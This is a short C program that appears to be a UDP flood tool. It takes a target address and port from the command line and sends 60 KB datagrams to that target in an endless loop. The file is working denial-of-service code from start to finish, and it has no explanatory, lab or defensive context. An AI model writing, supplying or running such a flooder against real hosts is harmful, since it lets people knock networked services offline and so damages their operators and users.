#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>

int main(int argc, char *argv[])
{
    struct sockaddr_in server_addr;
    int server_socket;
    int packet_size;
    char *packet;

    if(argc != 3)
    {
        printf("Usage: %s <target> <port>\n", argv[0]);
        exit(1);
    }

    server_socket = socket(AF_INET, SOCK_DGRAM, 0);
    if(server_socket == -1)
    {
        printf("Could not create the socket\n");
        exit(1);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(atoi(argv[2]));
    server_addr.sin_addr.s_addr = inet_addr(argv[1]);

    packet_size = 60 * 1024;
    packet = (char *)malloc(packet_size);
    if(packet == NULL)
    {
        printf("Could not allocate memory for the packet\n");
        exit(1);
    }

    memset(packet, 0, packet_size);

    while(1)
    {
        if(sendto(server_socket, packet, packet_size, 0, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0)
        {
            printf("Error in sending packet\n");
            break;
        }
        printf("Sending packets to %s:%s\n", argv[1], argv[2]);
    }

    free(packet);
    close(server_socket);
    return 0;
}